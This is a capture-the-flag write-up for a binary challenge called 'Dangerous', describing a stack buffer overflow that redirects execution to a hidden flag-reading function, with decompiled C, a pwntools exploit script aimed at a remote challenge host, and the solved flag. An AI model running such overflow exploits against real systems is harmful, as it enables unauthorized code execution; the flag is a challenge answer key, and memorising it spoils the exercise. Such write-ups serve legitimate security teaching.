# Dangerous

Disassembling it with `radare2` and `gdb` doesn't really seem to spit out anything interesting (as the binary is stripped), but we can use string to see that `flag.txt` is within the binary. This hints that there is actually something there.

So, to check it out, I disassembled the binary in GHidra. Sure enough, `FUN_0040130e` had some basic C code to read the file and output the results.

```c
void FUN_0040130e(void)

{
  char local_218 [524];
  int local_c;
  
  local_c = open("./flag.txt",0);
  read(local_c,local_218,0x200);
  close(local_c);
  puts(local_218);
  return;
}
```

All we had to do was overflow the buffer and execute the function.

Using `ragg2` I found that the padding was 497 bytes.

```python
from pwn import *

p = remote("jh2i.com", 50011)

p.clean(0.2)

payload = b"A" * 497
payload += p64(0x40130e)

p.sendline(payload)

print(p.clean(1))
```

**flag{legend_of_zelda_overflow_of_time}**